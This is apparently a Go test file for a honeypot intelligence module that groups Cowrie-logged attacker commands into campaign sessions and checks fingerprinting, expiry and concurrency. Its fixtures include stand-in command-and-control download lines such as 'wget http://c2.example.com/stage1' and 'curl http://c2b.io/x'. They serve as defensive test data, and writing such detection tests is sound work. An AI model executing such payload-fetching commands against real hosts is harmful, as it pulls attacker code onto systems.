package intelligence

import (
	"fmt"
	"sync"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

func makeTTPEvent(sourceIP, command string) *database.Event {
	return &database.Event{
		Honeypot:       "cowrie",
		SourceIP:       sourceIP,
		EventType:      "command",
		Command:        command,
		TechniqueID:    "T1059",
		KillChainStage: "execution",
		Timestamp:      time.Now().UTC(),
	}
}

// ---- session lifecycle ----

func TestNewSessionCreated(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "id")
	_, isNew := b.Update(ev)
	if !isNew {
		t.Error("first event should create a new session")
	}
}

func TestSessionMergesForSameCampaign(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	// Use same command stem so fingerprint matches.
	ev1 := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/stage1")
	ev2 := makeTTPEvent("203.0.113.2", "wget http://c2.example.com/stage2")

	_, isNew1 := b.Update(ev1)
	_, isNew2 := b.Update(ev2)

	if !isNew1 {
		t.Error("first event should be new")
	}
	if isNew2 {
		t.Error("second event with same stem should merge into existing session")
	}
}

func TestSessionEventCountGrows(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
	for i := 0; i < 5; i++ {
		b.Update(ev)
	}
	sessions := b.GetActiveSessions()
	if len(sessions) == 0 {
		t.Fatal("no active sessions")
	}
	if sessions[0].EventCount < 5 {
		t.Errorf("expected EventCount ≥ 5, got %d", sessions[0].EventCount)
	}
}

func TestSessionConfidenceGrowsWithEvents(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")

	var prev float64
	for i := 0; i < 10; i++ {
		b.Update(ev)
	}
	sessions := b.GetActiveSessions()
	if len(sessions) == 0 {
		t.Fatal("no active sessions")
	}
	prev = sessions[0].Confidence

	for i := 0; i < 50; i++ {
		b.Update(ev)
	}
	sessions = b.GetActiveSessions()
	if sessions[0].Confidence <= prev {
		t.Errorf("confidence should grow with more events: before=%f after=%f",
			prev, sessions[0].Confidence)
	}
}

func TestSessionConfidenceCappedAt095(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
	for i := 0; i < 1000; i++ {
		b.Update(ev)
	}
	sessions := b.GetActiveSessions()
	for _, s := range sessions {
		if s.Confidence > 0.95 {
			t.Errorf("confidence exceeds 0.95 cap: %f", s.Confidence)
		}
	}
}

// ---- expiry ----

func TestFlushExpiredRemovesStaleSessions(t *testing.T) {
	b := NewTTPBuilder(1 * time.Millisecond) // very short inactivity window
	ev := makeTTPEvent("203.0.113.1", "id")
	// Set an old timestamp so the session is immediately expired.
	ev.Timestamp = time.Now().UTC().Add(-1 * time.Hour)
	b.Update(ev)

	time.Sleep(5 * time.Millisecond)
	expired := b.FlushExpired()
	if len(expired) == 0 {
		t.Error("expected at least one expired session, got none")
	}
	if len(b.GetActiveSessions()) != 0 {
		t.Error("active sessions should be empty after flush")
	}
}

func TestFlushExpiredKeepsActiveSessions(t *testing.T) {
	b := NewTTPBuilder(10 * time.Minute)
	ev := makeTTPEvent("203.0.113.1", "wget http://c2.example.com/x")
	b.Update(ev)
	expired := b.FlushExpired()
	if len(expired) != 0 {
		t.Errorf("fresh session should not be expired, got %d expired", len(expired))
	}
}

// ---- fingerprint ----

func TestCampaignFingerprintStability(t *testing.T) {
	ev1 := makeTTPEvent("203.0.113.1", "wget http://c2.io/payload")
	ev2 := makeTTPEvent("203.0.113.2", "wget http://c2.io/stage2")
	if campaignFingerprint(ev1) != campaignFingerprint(ev2) {
		t.Error("same stem (wget) should produce the same campaign fingerprint")
	}
}

func TestCampaignFingerprintFallsBackToIP(t *testing.T) {
	// No command, no tools → fingerprint is based on source IP.
	ev := &database.Event{
		Honeypot:  "cowrie",
		SourceIP:  "203.0.113.5",
		EventType: "login_failed",
		Timestamp: time.Now().UTC(),
	}
	fp := campaignFingerprint(ev)
	if fp == "" {
		t.Error("fingerprint should not be empty")
	}
	// Same IP → same fingerprint.
	if fp != campaignFingerprint(ev) {
		t.Error("fingerprint should be deterministic")
	}
}

func TestDifferentToolsDifferentFingerprint(t *testing.T) {
	ev1 := makeTTPEvent("203.0.113.1", "wget http://c2a.io/x")
	ev2 := makeTTPEvent("203.0.113.1", "curl http://c2b.io/x")
	// wget vs curl → different stems → different fingerprints.
	if campaignFingerprint(ev1) == campaignFingerprint(ev2) {
		t.Error("different tool stems should produce different fingerprints")
	}
}

// ---- shared infrastructure ----

func TestSharedInfrastructureAWS(t *testing.T) {
	if !isSharedInfrastructure("52.12.34.56") {
		t.Error("AWS IP 52.x.x.x should be flagged as shared infrastructure")
	}
}

func TestSharedInfrastructurePrivateNotFlagged(t *testing.T) {
	// Private IPs are not cloud infrastructure.
	if isSharedInfrastructure("192.168.1.1") {
		t.Error("private IP should not be flagged as shared infrastructure")
	}
}

// ---- concurrency stress ----

func TestTTPBuilderConcurrent(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	const goroutines = 20
	const events = 100
	var wg sync.WaitGroup
	wg.Add(goroutines)
	for g := 0; g < goroutines; g++ {
		g := g
		go func() {
			defer wg.Done()
			for i := 0; i < events; i++ {
				// Use varied commands to create realistic spread of sessions.
				cmd := fmt.Sprintf("wget http://c2-%d.example.com/payload", g%5)
				ev := makeTTPEvent(fmt.Sprintf("203.0.113.%d", g+1), cmd)
				b.Update(ev)
			}
		}()
	}
	wg.Wait()

	sessions := b.GetActiveSessions()
	if len(sessions) == 0 {
		t.Error("expected active sessions after concurrent updates")
	}
}
